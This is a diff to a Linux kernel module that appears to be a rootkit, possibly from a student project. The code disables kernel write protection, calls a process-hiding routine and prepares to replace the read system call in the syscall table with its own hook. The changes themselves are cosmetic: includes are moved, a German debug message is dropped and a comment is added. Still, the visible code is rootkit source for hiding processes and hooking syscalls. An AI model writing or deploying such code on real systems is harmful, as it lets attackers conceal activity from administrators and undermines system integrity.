@@ -2,14 +2,15 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 #include <linux/sched.h>
-#include "sysmap.h"
 #include <asm/page.h>
 #include <asm/pgtable.h>
 #include <asm/unistd.h>
 #include <asm/processor-flags.h>
 #include <linux/string.h>
 #include <linux/slab.h>
+
 #include "process_hiding.h"
+#include "sysmap.h"
 
 MODULE_LICENSE("GPL");
 
@@ -19,7 +20,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 
-#define HOOK_READ 0
+#define HOOK_READ 0 
 
 void ** syscall_table = (void * *) sys_call_table_R;
 ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
@@ -60,9 +61,10 @@ static int __init mod_init(void)
 {
   disable_wp(); 
   
-  printk(KERN_INFO "Versuche proz verstk.\n");
   hide_processes();
   orig_sys_read = syscall_table[__NR_read];
+  
+  //Disable nasty compiler warnings
   #if HOOK_READ == 1
    syscall_table[__NR_read] = my_read;
   #else
